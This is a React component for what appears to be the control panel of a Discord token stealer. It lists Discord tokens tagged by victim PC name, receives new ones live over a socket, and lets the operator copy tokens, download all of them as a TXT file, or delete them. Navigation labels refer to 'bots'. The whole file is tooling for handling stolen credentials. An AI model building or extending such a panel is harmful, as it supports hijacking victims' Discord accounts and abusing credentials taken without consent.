import React, { useState, useEffect } from 'react';
import axios from 'axios';
import { Trash2, AlertTriangle, ChevronLeft, ChevronRight, Download, Copy, Check } from 'lucide-react';
import { API_BASE_URL } from '../../config';
import { socket } from '../../socket';
import { NetworkBackground } from '../NetworkBackground/NetworkBackground';
import { useLanguage } from '../../i18n/LanguageContext';
import { usePrivacy } from '../../context/PrivacyContext';
import './Discord.css';

interface DiscordTokenItem {
  id: number;
  pc_name: string;
  token: string;
  created_at: string;
}

interface DiscordProps {
  filterPcName?: string | null;
  userId?: number;
}

export const Discord: React.FC<DiscordProps> = ({ filterPcName, userId }) => {
  const { t } = useLanguage();
  const { privacyMode } = usePrivacy();
  const [tokens, setTokens] = useState<DiscordTokenItem[]>([]);
  const [currentPage, setCurrentPage] = useState<number>(1);
  const [selectedTokenId, setSelectedTokenId] = useState<number | null>(null);
  const [copiedId, setCopiedId] = useState<number | null>(null);
  const [toastMsg, setToastMsg] = useState<string | null>(null);

  const ITEMS_PER_PAGE = 10;

  const fetchTokens = async () => {
    try {
      const authToken = localStorage.getItem('token');
      const res = await axios.get(`${API_BASE_URL}/api/discord`, {
        headers: { Authorization: `Bearer ${authToken}` }
      });
      if (res.data.success) {
        setTokens(res.data.tokens);
      }
    } catch (err) {
      // silent
    }
  };

  useEffect(() => {
    fetchTokens();

    const handleNewTokens = (newTokensList: DiscordTokenItem[]) => {
      setTokens(newTokensList);
    };

    socket.on('discord_tokens_update', handleNewTokens);
    if (userId) {
      socket.on(`discord_tokens_update_${userId}`, handleNewTokens);
    }

    return () => {
      socket.off('discord_tokens_update', handleNewTokens);
      if (userId) {
        socket.off(`discord_tokens_update_${userId}`, handleNewTokens);
      }
    };
  }, [userId]);

  const displayedTokens = filterPcName 
    ? tokens.filter(t => t.pc_name.toLowerCase() === filterPcName.toLowerCase()) 
    : tokens;

  const totalPages = Math.ceil(displayedTokens.length / ITEMS_PER_PAGE) || 1;
  const paginatedTokens = displayedTokens.slice((currentPage - 1) * ITEMS_PER_PAGE, currentPage * ITEMS_PER_PAGE);

  const triggerToast = (msg: string) => {
    setToastMsg(msg);
    setTimeout(() => setToastMsg(null), 2000);
  };

  const handleCopyToken = (id: number, tokenText: string) => {
    navigator.clipboard.writeText(tokenText);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
    triggerToast('Token panoya kopyalandı!');
  };

  const handleDownloadTxt = () => {
    if (displayedTokens.length === 0) return;
    const textContent = displayedTokens.map((t) => t.token).join('\r\n');
    const blob = new Blob([textContent], { type: 'text/plain;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `discord_tokens_${new Date().toISOString().slice(0, 10)}.txt`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);
    triggerToast('Tüm tokenler TXT olarak indirildi!');
  };

  const handleDeleteToken = async () => {
    if (!selectedTokenId) return;
    try {
      const authToken = localStorage.getItem('token');
      await axios.delete(`${API_BASE_URL}/api/discord/${selectedTokenId}`, {
        headers: { Authorization: `Bearer ${authToken}` }
      });
      setTokens((prev) => prev.filter((t) => t.id !== selectedTokenId));
      triggerToast('Token silindi!');
    } catch (err) {
      // silent
    } finally {
      setSelectedTokenId(null);
    }
  };

  return (
    <div className="discord-container">
      <NetworkBackground />

      <div className="discord-top-header">
        <div className="discord-badge-wrapper">
          <span className="discord-badge-title">{t('discord.title')}</span>
          <span className="discord-count-badge">{displayedTokens.length}</span>
        </div>
        {displayedTokens.length > 0 && (
          <button className="discord-download-btn" onClick={handleDownloadTxt} title="TXT İndir">
            <Download size={14} />
            <span>TXT {t('common.fetch')}</span>
          </button>
        )}
      </div>

      {displayedTokens.length === 0 ? (
        <div className="discord-empty-box">{t('discord.no_tokens')}</div>
      ) : (
        <table className="discord-table">
          <thead>
            <tr>
              <th>{t('discord.pc')}</th>
              <th>{t('discord.token')}</th>
              <th>{t('discord.date')}</th>
              <th style={{ width: '90px', textAlign: 'center' }}>{t('discord.action')}</th>
            </tr>
          </thead>
          <tbody>
            {paginatedTokens.map((item) => (
              <tr key={item.id}>
                <td style={{ fontWeight: 600 }} className={privacyMode ? 'privacy-blur' : ''}>{item.pc_name}</td>
                <td className={`discord-token-cell ${privacyMode ? 'privacy-blur' : ''}`}>{item.token}</td>
                <td style={{ color: '#a1a1aa', fontSize: '0.8rem' }}>
                  {new Date(item.created_at).toLocaleString('tr-TR', { dateStyle: 'short', timeStyle: 'short' })}
                </td>
                <td style={{ textAlign: 'center' }}>
                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '0.4rem' }}>
                    <button
                      className="trash-btn"
                      onClick={() => handleCopyToken(item.id, item.token)}
                      title={t('common.copy')}
                    >
                      {copiedId === item.id ? <Check size={15} color="#22c55e" /> : <Copy size={15} />}
                    </button>
                    <button
                      className="trash-btn"
                      onClick={() => setSelectedTokenId(item.id)}
                      title={t('discord.delete_title')}
                    >
                      <Trash2 size={15} />
                    </button>
                  </div>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      )}

      {/* ELEGANT MINIMALIST SAYFA DEĞİŞTİRME */}
      {totalPages > 1 && (
        <div className="pagination-wrapper">
          <button
            className="pagination-icon-btn"
            disabled={currentPage <= 1}
            onClick={() => setCurrentPage((p) => Math.max(1, p - 1))}
            title={t('bots.prev_page')}
          >
            <ChevronLeft size={16} />
          </button>
          <span className="pagination-text">
            {currentPage} / {totalPages}
          </span>
          <button
            className="pagination-icon-btn"
            disabled={currentPage >= totalPages}
            onClick={() => setCurrentPage((p) => Math.min(totalPages, p + 1))}
            title={t('bots.next_page')}
          >
            <ChevronRight size={16} />
          </button>
        </div>
      )}

      {/* SİLME ONAY MODALI */}
      {selectedTokenId !== null && (
        <div className="modal-overlay" onClick={() => setSelectedTokenId(null)}>
          <div className="modal-content" onClick={(e) => e.stopPropagation()}>
            <div className="modal-header">
              <AlertTriangle color="#ffffff" size={22} />
              <h3>{t('discord.delete_title')}</h3>
            </div>
            <p className="modal-body">
              {t('discord.delete_desc')}
            </p>
            <div className="modal-actions">
              <button className="btn-modal-cancel" onClick={() => setSelectedTokenId(null)}>
                {t('common.cancel')}
              </button>
              <button className="btn-modal-delete" onClick={handleDeleteToken}>
                {t('common.delete')}
              </button>
            </div>
          </div>
        </div>
      )}

      {/* FLOATING SAĞ ALT BİLDİRİM TOAST */}
      {toastMsg && (
        <div className="bottom-right-toast">
          <Check size={18} color="#22c55e" />
          <span>{toastMsg}</span>
        </div>
      )}
    </div>
  );
};
